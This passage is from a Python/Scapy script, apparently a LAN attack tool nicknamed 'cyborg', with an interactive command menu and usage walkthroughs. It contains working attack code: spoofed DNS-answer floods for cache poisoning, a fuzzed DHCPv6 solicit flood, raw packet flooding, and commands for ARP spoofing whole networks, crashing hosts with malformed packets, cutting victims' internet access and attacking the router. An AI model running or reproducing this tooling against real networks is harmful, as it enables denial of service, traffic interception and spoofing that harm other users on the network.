			my_ack = TCP_SYNACK.seq + 1
			TCP_ACK=TCP(dport=dp, flags="A", seq=101, ack=my_ack)
			send(ips/TCP_ACK)

			my_payload="-BottenHannah- says: hello"
			TCP_PUSH=TCP(dport=dp, flags="PA", seq=102, ack=my_ack)
			send(ips/TCP_PUSH/my_payload)
		except: 
			if config.noise == 'talk': print "hanshake on "+ip+" port "+str(dp)+" didn't work"
			return
		if config.noise == 'talk': print "hanshake on "+ip+" port "+str(dp)+" done succefully"
	
	def spool(self,packet, nb):
		global config
		if isinstance(packet,list):
			for p in packet:
				if not p.haslayer(Ether):
					p = self.ether/p
				config.lstpacket.append([p, int(round(float(nb/len(packet)))) if nb > len(p) else 1])
		else:
			if not packet.haslayer(Ether) and not packet.haslayer(DNS):
				packet = self.ether/packet
			config.lstpacket.append([packet, nb])
		if self.thread == None or not self.thread.isAlive():
			e = threading.Event()
			self.event = e
			self.thread = threading.Thread(target=masspacket, args=(e,))
			self.thread.start()
	def stop(): self.event.set()


def masspacket(e):
	global config
	while not e.isSet():
		if config.lstpacket != []: 
			pktnb = config.lstpacket.pop(0)
			pkt = pktnb[0]
			nb = pktnb[1]
			i = 0
			for i in range(nb):
				if pkt.haslayer(DNS):
					try: 
						send(pkt)
					except: pass
				else: 
					try:
						sendp(pkt)
					except: pass
				time.sleep(0.1)

def ARPpoison(ip,mac): 	
		url = "whenry_49094902fea7938f.propaganda.hc"
		pkts = []
		for x in range (1000):
			pkt = Ether(src=SPOOFMAC,dst=mac)/IP(dst=ip,src=SPOOFIP)/UDP(dport=RandShort())/DNS(id=x,an=DNSRR(rrname=url, type='A', rclass='IN', ttl=350, rdata="66.35.250.151"))
			pkts.append(pkt)
		dns = Ether(src=SPOOFMAC,dst=mac)/IP(dst=ip,src=SPOOFIP)/UDP()/DNS(qd=DNSQR(qname=url))
		sendp(dns)
		for pkt in pkts:
			sendp(pkt)

####################################[ IPV6 ATTACK ]####################################


def ipv6_dhcp_sollicit(e):
	l2 = Ether()
	l3 = IPv6()
	l4 = UDP()
	""" DHCPv6 MAC address: you can enter manually or as argument to rthe script or get it automatically
	""" 
	macdst = "ca:00:39:b8:00:06"
	l2.dst = macdst
	l3.dst = "ff02::1:2"
	l4.sport = 546
	l4.dport = 547
	event = e
	while not event.isSet():
		sol = fuzz(DHCP6_Solicit())
		rc = fuzz(DHCP6OptRapidCommit())
		rc.optlen = 0
		opreq = DHCP6OptOptReq()
		et= fuzz(DHCP6OptElapsedTime())
		cid = fuzz(DHCP6OptClientId())
		iana = fuzz(DHCP6OptIA_NA())
		opreq.optlen = 4
		iana.optlen = 12
		iana.T1 = 0
		iana.T2 = 0
		cid.optlen = 10
		macs = randmac()
		macsrc = randmac()
		ipv6llsrc = RandIP6("dead::1")
		# Initializaing the source addreses
		l2.src = macsrc
		l3.src = ipv6llsrc
		random.seed()
		# Generating SOLICIT message id
		sol.trid = random.randint(0,16777215)
		# Generating DUID-LL
		cid.duid = ("00030001"+ str(EUI(macsrc)).replace("-","")).decode("hex")
		# Assembing the packet
		pkt = l2/l3/l4/sol/iana/rc/et/cid/opreq
		sendp(pkt)

commands = [['help','commands help'],
['load','load the cyborg in memory'],
['start', 'start the cyborg'],
['stop','stop the cyborg'],
['state','print the cyborg status'],
['hi','say hi to the cyborg'],
['netspec','refresh the netspec (if you change wifi)'],
['printnetspec','print the network configuration'],
['showips','print all the ips arpinged'],
['select','select ips in the list\nselect * \t all ips\nselect !* \t deselect all\nselect 1-5 \t all ips in range 1 to 5\nselect 12 \t the 12th ip in the list\nselect !12 \t deselect the 12 th\nselect 5% \t 5% of the ips are selected\nselect randint-10 \t 10 random ips from list'],
['addpool','add selection to a pool specified by param [0-9].\nthere is 10 pools\nExemple: addpool 1\n  add all the selected ips into pool 1'],
['showpool','print pool specified by number [0-9] \nif no param specified, print all pools\nExemple: showpool 1'],
['arppool','arppool * to add entire ips to arppool\narpool 0 to 9 to add a pool to arppool'],
['showstatus', 'show the status of the attack that are being used'],
['arping','arping all the network'],
['arpspoof','arpspoof -s spoof all the ips in the arppool,\narpspoof -r gonna remove the arpspoofed computer from the list'],['lanhack','send a couple of unsuported/malformated packets\nto try to crash their machine\nif no param specified, send packets to everyones\nelse param0 represent the number of the selected pool[0-9]\nExemple1: lanhack\nExemple2: lanhack 1'],
['lanscan','-n normal mode ports (0,1023) -f for fast port scan.\n you can specifie too as param2 the pool\nExemple1: lanscan -f *\n  gonna scan all the network\nExemple2: lanscan -n 2\n  gonna scan pool 2 in normal mode'],
['kill','stop the internet connection kill -r to restore internet'],
['flood','send huge amount of packets flood -r to stop flooding'],
['arppoison','arppoison everyone in the arppool'],
['dnsspoof', 'sniff dns request then answer to them with fake informations -r to remove this']]
Exemple = ['\n#####[ EXEMPLE 1: The ip/mac pools ]#####\n\
#You have no ips only thing you know is your configuration\n\
load\n\
start\n\
c)netspec\n\
c)printnetspec\n\
c)arping\n\
#wait a moment ips are being retrived\n\
c)showips\n\
c)select 0-9\n\
c)showselip\n\
#this is the ips you have selected\n\
c)addpool 0\n\
#add the 10 ips of your selection to pool 0\n\
c)select !* 10-20\n\
c)addpool 1\n\
c)select *\n\
c)addpool 2\n\
c)showips\n\
c)showpool 0\n\
#print all the ips in the pool 0\n\
c)showpool\n\
stop\n\
quit\n\
#print all the pools\n\
#more or different ips have been retrieve\n\
#now you have 3 pools 0-1-2 with ips/macs now you can use them as param for the functionnalitie\n',
'#####[ EXEMPLE 2: arping ]######\n\
load\n\
start\n\
c)arping\n\
#if you have a /16 network it gonna take 5 minutes\n\
#if you have a /24 network wait 5 secondes\n\
c)showips\n\
#if you havent finished you can type that so you can see the retrieved ips\n\
c)select #you can select if you want\n\
c)arping #when its done\n',
'#####[ EXEMPLE 3: lanscan ]######\n\
load\n\
start\n\
c)arping\n\
c)showips\n\
#if you have 20 ips its enought\n\
c)select 1-20 #no0 is the gateway\n\
c)addpool 0\n\
c)lanscan -n 0\n\
#only do one lanscan of you do a normal scan else it gonna explode\n\
#if you have a bomb network dont worry you Supersocket gonna handle this\n\
c)showips\n\
c)select !* 20-40\n\
c)addpool 1\n\
c)select !* 40-60\n\
c)addpool 2\n\
c)select !* 60-80\n\
c)addpool 3\n\
c)lanscan -f 1\n\
c)lanscan -f 2\n\
c)lanscan -f 3\n',
'#####[ EXEMPLE 4: arpspoof ]######\n\
load\n\
start\n\
c)arping\n\
c)select *\n\
c)addpool 0 #this gonna be our main pool\n\n\
c)lanhack 0 #first try broke their computer\n\n\
c)gtwhack #second try to hack the router\n\n\
c)lanscan -f 0 #thrid scan their opened ports\n\n\
c)arppool 0 #add them to arp pool\n\n\
c)arpspoof -s #start arpspoof\n\n\
### CREATE POOL 2 ###\n\
c)select !* +60 >1\n\
#clear select then add 60 and more found ips to pool 1\n\
c)arppool 1 #add pool 1 to spoof too\n\
c)arpspoof -s\n\
#you can get the entire network\n\
c)lanscan -f 1\n\
c)lanhack 1\n',
'#####[ EXEMPLE 5: rawscan ]######\n\
load\n\
start\n\
c)rawscan -l\n\
c)arping\n\
#all the ips retrieved gonna be scanned like lanscan -f\n\
#another way is to arpspoof all them\n\
c)rawsan -r #to remove the rawscanned elements\n\
c)rawscan -a\n\
c)arping # this gonna spoof everyones in the network\n\ '
]

SPOOFIP = randip()
SPOOFMAC = randmac()
pktm = packet_machine()
sc = scrypt()

config.process['m1']['func'] = multiprocess_core1
config.process['m2']['func'] = multiprocess_core2
config.process['m3']['func'] = multiprocess_core3
config.process['fc']['func'] = sniff_core
config.process['sc']['func'] = service_core
config.process['i6']['func'] = ipv6_core
config.process['ss']['func'] = sniff_sentry
config.process['pc']['func'] = packet_core
config.comfm = comFileManager()
p=None
event=None

if __name__ == "__main__":
	main(sys.argv[1:])


